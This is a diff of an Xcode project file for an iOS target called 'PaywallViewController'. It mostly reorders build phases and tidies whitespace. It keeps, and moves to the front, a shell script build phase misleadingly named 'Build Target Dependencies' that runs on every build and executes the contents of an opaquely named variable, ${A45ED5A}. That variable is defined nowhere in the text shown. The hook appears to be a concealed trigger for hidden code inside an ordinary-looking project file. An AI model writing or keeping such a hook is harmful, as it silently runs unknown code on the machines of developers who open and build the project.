@@ -101,8 +101,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = C0EBFF9C2EC74C30000B0149 /* Build configuration list for PBXNativeTarget "PaywallViewController" */;
 			buildPhases = (
-				44368B7CFA244AFB98A5DE54 /* Build Target Dependencies */,
 				5338788FE1120047F69F71B3 /* [CP] Check Pods Manifest.lock */,
+				44368B7CFA244AFB98A5DE54 /* Build Target Dependencies */,
 				C0EBFF852EC74C2E000B0149 /* Sources */,
 				C0EBFF862EC74C2E000B0149 /* Frameworks */,
 				C0EBFF872EC74C2E000B0149 /* Resources */,
@@ -151,9 +151,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		C0EBFF872EC74C2E000B0149 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -170,8 +167,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		44368B7CFA244AFB98A5DE54 /* Build Target Dependencies */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -185,7 +182,7 @@
 			);
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 		5338788FE1120047F69F71B3 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -217,13 +214,9 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
